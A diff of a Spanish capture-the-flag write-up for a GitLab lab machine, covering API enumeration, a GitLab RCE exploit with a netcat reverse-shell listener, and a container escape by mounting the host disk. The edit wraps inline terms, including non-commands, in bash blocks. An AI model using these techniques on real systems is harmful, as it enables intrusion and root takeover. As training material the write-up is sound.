@@ -62,18 +62,34 @@ Es un nginx con gitlab y nos reporta un redirect al http://10.10.10.220/users/si
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.220:5080` nos redirige automaticamente a la pagina de Sign in de gitlab Community edition.
-Siendo un gitlab podemos ver el `robots.txt`.
+Si entramos en la url 
+```bash
+ http://10.10.10.220:5080 
+```
+ nos redirige automaticamente a la pagina de Sign in de gitlab Community edition.
+Siendo un gitlab podemos ver el 
+```bash
+ robots.txt 
+```
+.
 
 Vemos routas que pueden ser interesantes como
 
 - /api
 
 
-En el caso de la routa `/api` si tiramos de esta routa con firefox, vemos que necessitamos logearnos para continuar. Pero en ciertos casos,
+En el caso de la routa 
+```bash
+ /api 
+```
+ si tiramos de esta routa con firefox, vemos que necessitamos logearnos para continuar. Pero en ciertos casos,
 hay possibilidades de poder, de forma no authenticada, obtener informaciones relevantes.
 
-Si buscamos en google por `gitlab api`, vemos de que manera podemos utilizar la api para recoger informaciones.
+Si buscamos en google por 
+```bash
+ gitlab api 
+```
+, vemos de que manera podemos utilizar la api para recoger informaciones.
 
 ```bash
 curl -s -X GET "http://10.10.10.220:5080/api/v4/version"
@@ -120,7 +136,15 @@ Mirando el codigo, vemos que este exploit nos permiteria entablar una reverse sh
 - cookie de session.
 
 El valor del authenticity token se puede encontrar en el codigo fuente de la pagina de gitlab.
-El valor del cookie de session se puede ver en la pagina de gitlab dandole a `Ctrl+Shift+c > Almacenamiento` y podemos ver el `_gitlab_session`
+El valor del cookie de session se puede ver en la pagina de gitlab dandole a 
+```bash
+ Ctrl+Shift+c > Almacenamiento 
+```
+ y podemos ver el 
+```bash
+ _gitlab_session 
+```
+
 
 1. Nos ponemos en escucha por el puerto 443
 
@@ -128,7 +152,11 @@ El valor del cookie de session se puede ver en la pagina de gitlab dandole a `Ct
     nc -nlvp 443
     ```
 
-1. Lanzamos el script con el commando `python3 gitlab_rce.py`
+1. Lanzamos el script con el commando 
+```bash
+ python3 gitlab_rce.py 
+```
+
 
 
 ```bash
@@ -153,7 +181,11 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-Podemos ir al directorio `/home/dude` y visualizar la flag
+Podemos ir al directorio 
+```bash
+ /home/dude 
+```
+ y visualizar la flag
 ## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
@@ -169,7 +201,11 @@ hostname -I
 hostname
 ```
 
-Aqui podemos ver que el comando `hostname -I` nos da una ip que no es la ip de la maquina victima. Estamos en un contenedor
+Aqui podemos ver que el comando 
+```bash
+ hostname -I 
+```
+ nos da una ip que no es la ip de la maquina victima. Estamos en un contenedor
 
 #### Escapar del contenedor {-}
 
@@ -180,7 +216,19 @@ cd /opt
 ls -l
 ```
 
-Vemos un fichero `/root_pass` en la raiz, y en el directorio opt vemos un directorio `backup` y `gitlab`.
+Vemos un fichero 
+```bash
+ /root_pass 
+```
+ en la raiz, y en el directorio opt vemos un directorio 
+```bash
+ backup 
+```
+ y 
+```bash
+ gitlab 
+```
+.
 
 ```bash
 cat /root_pass
@@ -220,21 +268,37 @@ whoami
 root
 ```
 
-Emos podido passar al usuario root pero del contenedor. Aqui algo que todavia suena turbio es este fichero `root_pass`.
+Emos podido passar al usuario root pero del contenedor. Aqui algo que todavia suena turbio es este fichero 
+```bash
+ root_pass 
+```
+.
 Buscamos en los ficheros la coincidencias de este fichero
 
 ```bash
 grep -r -i "root_pass" 2>/dev/null
 ```
 
-Aqui vemos un `/dev/sda2` que parece montado sobre un **root_pass**
+Aqui vemos un 
+```bash
+ /dev/sda2 
+```
+ que parece montado sobre un **root_pass**
 
 ```bash
 df -h
 fdisk -l
 ```
 
-Aqui vemos que en `/dev/sda2` hay un linux filesystem de 18G que se monta directamente con `/root_pass`. Vamos a intentar montarlo.
+Aqui vemos que en 
+```bash
+ /dev/sda2 
+```
+ hay un linux filesystem de 18G que se monta directamente con 
+```bash
+ /root_pass 
+```
+. Vamos a intentar montarlo.
 
 ```bash
 mkdir /mnt/mounted
